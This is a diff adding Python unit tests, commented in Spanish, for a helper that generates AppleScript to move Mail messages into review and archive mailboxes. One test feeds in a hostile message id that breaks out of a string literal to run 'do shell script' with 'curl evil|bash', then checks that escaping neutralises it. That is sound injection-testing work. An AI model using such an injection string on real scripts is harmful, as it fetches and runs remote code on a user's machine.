@@ -1618,6 +1618,146 @@ class TestMontarMoverContratoCompletoCM1(unittest.TestCase):
             json.dumps(out, ensure_ascii=False)          # siempre serializable
 
 
+class TestMontarMoverArchivoNativoBlindadoF5(unittest.TestCase):
+    """F5 (re-auditoría 2026-07-19): en archivo nativo, la resolución del buzón
+    "Archive" corría FUERA de todo try; si el buzón no existía (iCloud lo
+    localiza o lo llama "Archived Messages") el SCRIPT 3 podía abortar antes de
+    mover nada, contradiciendo su propio comentario. El fix (seguro bajo AMBAS
+    hipótesis) la envuelve en su try con flag arcBoxOK, gobierna el bloque de
+    archive con un guard y, si el buzón no resuelve, manda TODOS los mids_archive
+    a fallidos_archive con archivo_nativo_fallido:1. El modo NO nativo
+    (destino_archive con carpeta) queda byte-idéntico."""
+
+    def _nat(self, **kw):
+        d = {"cuenta": "iCloud", "origen": "INBOX", "destino_review": "Revisar",
+             "destino_archive": "", "mids_review": ["a@x.com"],
+             "mids_archive": ["b@y.com", "c@z.com"]}
+        d.update(kw)
+        return d
+
+    def _no_nat(self, **kw):
+        d = {"cuenta": "iCloud", "origen": "INBOX", "destino_review": "Revisar",
+             "destino_archive": "Archivo", "mids_review": ["a@x.com"],
+             "mids_archive": ["b@y.com"]}
+        d.update(kw)
+        return d
+
+    def test_nativo_resuelve_arcbox_en_try_con_flag(self):
+        out = th.cmd_montar_mover(self._nat())
+        self.assertTrue(out["ok"])
+        self.assertTrue(out["archivo_nativo"])
+        s = out["script"]
+        for frag in ("set arcBoxOK to true", "set arcNativoFallido to 0",
+                     "on error", "set arcBoxOK to false",
+                     "set arcNativoFallido to 1", "end try"):
+            self.assertIn(frag, s)
+        # el set del buzón vive DENTRO del try: try < set arcBox < on error
+        i_try = s.index("\n    try\n")
+        i_set = s.index('set arcBox to mailbox "Archive" of acct')
+        i_err = s.index("\n    on error\n")
+        self.assertTrue(i_try < i_set < i_err,
+                        "la resolución del buzón nativo no está dentro del try")
+
+    def test_nativo_guard_manda_archive_a_fallidos_si_no_resuelve(self):
+        out = th.cmd_montar_mover(self._nat())
+        s = out["script"]
+        self.assertIn("    if arcBoxOK then\n", s)
+        self.assertIn("        set okArc to 0\n", s)
+        self.assertIn("        set failArc to toArchive\n", s)
+        self.assertIn("    end if\n", s)
+        # el repeat de archive queda gobernado por el guard (if < repeat < else)
+        i_guard = s.index("    if arcBoxOK then\n")
+        i_rep = s.index("repeat with theID in toArchive")
+        i_else = s.index("    else\n")
+        self.assertTrue(i_guard < i_rep < i_else)
+
+    def test_nativo_return_expone_motivo_parseable(self):
+        out = th.cmd_montar_mover(self._nat())
+        s = out["script"]
+        ret = [l for l in s.splitlines() if l.strip().startswith("return ")][0]
+        self.assertIn("archivo_nativo_fallido:", ret)
+        # formato clave:valor, en la sección movidos, antes de los fallidos
+        self.assertLess(ret.index("archivo_nativo_fallido:"),
+                        ret.index("| fallidos_review:"))
+        self.assertGreater(ret.index("archivo_nativo_fallido:"),
+                           ret.index("movidos_archive:"))
+        self.assertIn('"] fallidos_archive:[" & (failArc as string)', s)
+
+    def test_nativo_comentario_dice_la_verdad_nueva(self):
+        out = th.cmd_montar_mover(self._nat())
+        s = out["script"]
+        self.assertIn("el script NO aborta", s)
+        self.assertIn("archivo_nativo_fallido:1", s)     # promesa explícita
+        self.assertIn("define destino_archive con el nombre real", s)
+        # la vieja promesa engañosa ("Si el move falla...") desaparece
+        self.assertNotIn("Si el move falla, esos mids salen", s)
+
+    def test_no_nativo_sin_maquinaria_nativa(self):
+        out = th.cmd_montar_mover(self._no_nat())
+        self.assertFalse(out["archivo_nativo"])
+        s = out["script"]
+        for frag in ("arcBoxOK", "arcNativoFallido",
+                     "archivo_nativo_fallido", "if arcBoxOK then"):
+            self.assertNotIn(frag, s)
+        # el buzón se resuelve en una sola línea, sin try envolvente
+        self.assertIn('    set arcBox to mailbox "Archivo" of acct\n', s)
+
+    def test_no_nativo_hostil_sin_maquinaria_nativa(self):
+        hostil = 'evil") do shell script "curl evil|bash'
+        out = th.cmd_montar_mover(self._no_nat(destino_review='Correo "x"',
+                                               mids_archive=[hostil]))
+        self.assertTrue(out["ok"])
+        s = out["script"]
+        for frag in ("arcBoxOK", "archivo_nativo_fallido", "if arcBoxOK then"):
+            self.assertNotIn(frag, s)
+        # el escape sigue vivo: la comilla del mid no cierra el literal
+        self.assertIn('\\"', s)
+        for ln in s.splitlines():
+            self.assertFalse(ln.strip().startswith("do shell script"))
+
+    def test_nativo_con_reply_movido_conserva_token_y_orden(self):
+        out = th.cmd_montar_mover(self._nat(destino_reply_needed="Responder",
+                                            mids_reply_needed=["r@z.com"]))
+        self.assertTrue(out["reply_needed_movido"])
+        ret = [l for l in out["script"].splitlines()
+               if l.strip().startswith("return ")][0]
+        self.assertIn("movidos_reply:", ret)
+        self.assertIn("archivo_nativo_fallido:", ret)
+        # el token nativo va tras movidos_reply y antes de los fallidos
+        self.assertLess(ret.index("movidos_reply:"),
+                        ret.index("archivo_nativo_fallido:"))
+        self.assertLess(ret.index("archivo_nativo_fallido:"),
+                        ret.index("| fallidos_review:"))
+
+    def test_nativo_bloques_applescript_balanceados(self):
+        out = th.cmd_montar_mover(self._nat())
+        lineas = [l.strip() for l in out["script"].splitlines()]
+        opib = sum(1 for l in lineas if l.endswith(" then"))
+        tells = sum(1 for l in lineas if l.startswith("tell application"))
+        reps = sum(1 for l in lineas if l.startswith("repeat with"))
+        self.assertEqual(opib, lineas.count("end if"))
+        self.assertEqual(lineas.count("try"), lineas.count("end try"))
+        self.assertEqual(reps, lineas.count("end repeat"))
+        self.assertEqual(tells, lineas.count("end tell"))
+        # el fix añade exactamente 1 try envolvente (con on error) y 1 guard if
+        self.assertEqual(lineas.count("try"), 3)         # arcBox + review + archive
+        self.assertEqual(lineas.count("on error"), 1)
+        self.assertEqual(opib, 3)                        # 2 (count>0) + 1 (arcBoxOK)
+
+    def test_nativo_es_total_ante_basura(self):
+        casos = [
+            self._nat(mids_archive="nolista"),
+            self._nat(mids_archive=[{"x": 1}]),
+            self._nat(mids_archive=[None, True]),
+            self._nat(mids_review=[[1, 2]]),
+            self._nat(destino_archive=None, mids_archive=["b@y.com"]),
+        ]
+        for c in casos:
+            out = th.cmd_montar_mover(c)
+            self.assertIsInstance(out, dict)
+            self.assertIn("ok", out)
+            json.dumps(out, ensure_ascii=False)          # siempre serializable
+
 class TestBlindajeScoringEntradaQW1(unittest.TestCase):
     """Auditoría 2026-07-10 (QW1/F1): entradas imperfectas en la ruta de
     scoring devuelven el contrato {"ok": False, ...} o aíslan el item del
